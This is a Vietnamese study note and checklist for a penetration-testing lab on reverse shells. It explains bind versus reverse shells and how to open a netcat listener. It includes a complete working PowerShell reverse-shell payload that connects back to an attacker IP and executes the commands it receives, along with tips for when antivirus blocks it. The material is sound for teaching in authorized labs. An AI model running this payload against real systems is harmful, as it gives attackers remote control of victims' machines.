# Reverse Shell

## Khái niệm

Reverse shell là kiểu shell trong đó **attacker/Pwnbox mở listener trước**, sau đó **target chủ động kết nối ngược về attacker**.

Mô hình:

```text
Target ---> Attacker:Port
```
So sánh:

```
Bind shell:
Target listen
Attacker connect vào target

Reverse shell:
Attacker listen
Target connect ngược về attacker
```
## Vì sao reverse shell phổ biến?

Reverse shell thường dễ dùng hơn bind shell vì:

- Firewall thường chặn inbound connection vào server.
- Outbound connection từ server ra ngoài thường ít bị kiểm soát hơn.
- Port phổ biến như 443/HTTPS thường được phép outbound.
- Trong pentest, reverse shell thường được kích hoạt thông qua RCE, command injection, unrestricted file upload, web shell, v.v.

## Mở listener trên Pwnbox

```
sudo nc -lvnp 443
```

Giải thích:

- `sudo`: cần quyền cao vì port 443 là privileged port.
- `nc`: Netcat.
- `-l`: listen mode.
- `-v`: verbose.
- `-n`: không resolve DNS.
- `-p 443`: listen trên port 443.

## PowerShell reverse shell trên Windows target

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Version dễ đọc hơn:
```C#
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.2",443)

$stream = $client.GetStream()

[byte[]]$bytes = 0..65535 | ForEach-Object {0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)

    $sendback = (Invoke-Expression $data 2>&1 | Out-String)

    $sendback2 = $sendback + "PS " + (pwd).Path + "> "

    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)

    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}

$client.Close()
```
Cần đổi:

```
<ATTACKER_IP> = IP Pwnbox/VPN của mình
443 = port listener đang mở
```

## Khi thành công

Bên Pwnbox sẽ thấy:

```
Connection received
PS C:\Users\htb-student>
```

Test shell:

```
whoami
hostname
ipconfig
dir
pwd
```

## Ghi nhớ

- Reverse shell = target connect về attacker.
- Bind shell = attacker connect vào target.
- Netcat không native trên Windows, nên thường dùng PowerShell/cmd hoặc công cụ có sẵn.
- Payload public dễ bị Windows Defender/AV phát hiện.
- Chỉ thực hành trong lab hoặc hệ thống có authorization.

---

# Reverse Shell Lab Checklist  
  
## 1. Chuẩn bị  
  
- [ ] Spawn Pwnbox/attack box.  
- [ ] Spawn Windows target.  
- [ ] Kết nối VPN/Academy network.  
- [ ] Xác định IP Pwnbox/VPN của mình.  
- [ ] Xác định port muốn listen, ví dụ `443`.  
  
## 2. Kiểm tra IP attack box  
  
Trên Pwnbox:  
  
```bash  
ip -br a
```
Hoặc:

```
ip a
```

Tìm IP dạng `10.10.x.x` hoặc IP HTB VPN/Pwnbox.

## 3. Mở listener trên Pwnbox

```
sudo nc -lvnp 443
```

Nếu không muốn dùng `sudo`, chọn port cao hơn, ví dụ:

```
nc -lvnp 4444
```

## 4. Chuẩn bị payload PowerShell

Thay IP trong payload:

```
10.10.14.158 -> IP Pwnbox của mình
```

Thay port nếu cần:

```
443 -> port listener của mình
```

## 5. Chạy payload trên Windows target

- [ ]  Mở Command Prompt hoặc PowerShell trên target.
- [ ]  Paste payload.
- [ ]  Enter để chạy.
- [ ]  Nếu paste lỗi trong browser/Pwnbox, paste vào Notepad trong target trước rồi copy lại.

## 6. Kiểm tra shell trên Pwnbox

Sau khi target connect về, chạy:

```
whoami
hostname
pwd
dir
ipconfig
```

Nếu thấy prompt kiểu:

```
PS C:\Users\htb-student>
```

thì reverse shell đã thành công.

## 7. Nếu không nhận được shell

- [ ]  Kiểm tra listener có đang chạy chưa.
- [ ]  Kiểm tra IP trong payload có đúng IP Pwnbox không.
- [ ]  Kiểm tra port trong payload có trùng với port listener không.
- [ ]  Kiểm tra target có route được tới Pwnbox không.
- [ ]  Kiểm tra Windows Defender/AV có chặn payload không.
- [ ]  Thử port khác như `4444`, `8080`, hoặc `443`.
- [ ]  Kiểm tra lỗi copy/paste payload.
- [ ]  Đảm bảo không dùng nhầm IP target thay vì IP attacker.

## 8. Ghi nhớ an toàn

- [ ]  Chỉ chạy trong lab hoặc hệ thống được phép.
- [ ]  Không tắt antivirus trên máy thật nếu không có lý do hợp lệ.
- [ ]  Không dùng payload reverse shell ngoài phạm vi pentest/CTF/lab.